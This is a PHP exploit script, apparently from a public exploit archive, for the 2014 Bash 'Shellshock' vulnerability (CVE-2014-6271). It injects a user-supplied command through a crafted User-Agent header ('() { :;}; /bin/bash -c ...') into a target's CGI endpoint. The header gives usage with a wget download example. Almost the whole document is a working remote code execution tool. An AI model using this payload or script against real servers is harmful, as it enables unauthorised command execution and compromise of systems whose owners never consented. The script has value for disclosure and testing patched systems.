/*
Title: Bash Specially-crafted Environment Variables Code Injection Vulnerability
CVE: 2014-6271
Vendor Homepage: https://www.gnu.org/software/bash/
Author: Prakhar Prasad && Subho Halder
Author Homepage: https://prakharprasad.com && https://appknox.com
Date: September 25th 2014
Tested on: Mac OS X 10.9.4/10.9.5 with Apache/2.2.26
       GNU bash, version 3.2.51(1)-release (x86_64-apple-darwin13)
Usage: php bash.php -u http://<hostname>/cgi-bin/<cgi> -c cmd
       Eg. php bash.php -u http://localhost/cgi-bin/hello -c "wget http://appknox.com -O /tmp/shit"
Reference: https://www.reddit.com/r/netsec/comments/2hbxtc/cve20146271_remote_code_execution_through_bash/
 
Test CGI Code : #!/bin/bash
        echo "Content-type: text/html"
        echo ""
        echo "Bash-is-Vulnerable"
 
*/
error_reporting(0);
if(!defined(&#039;STDIN&#039;)) die("Please run it through command-line!\n");
$x  = getopt("u:c:");
if(!isset($x[&#039;u&#039;]) || !isset($x[&#039;c&#039;]))
{
die("Usage: ".$_SERVER[&#039;PHP_SELF&#039;]." -u URL -c cmd\n");
 
}
$url = $x[&#039;u&#039;];
$cmd = $x[&#039;c&#039;];
 
    $context = stream_context_create(
        array(
            &#039;http&#039; => array(
                &#039;method&#039;  => &#039;GET&#039;,
                &#039;header&#039;  => &#039;User-Agent: () { :;}; /bin/bash -c "&#039;.$cmd.&#039;"&#039;
            )
        )
    );
     
    if(!file_get_contents($url, false, $context) && strpos($http_response_header[0],"500") > 0)
    die("Command sent to the server!\n");
    else
    die("Connection Error\n");
?>

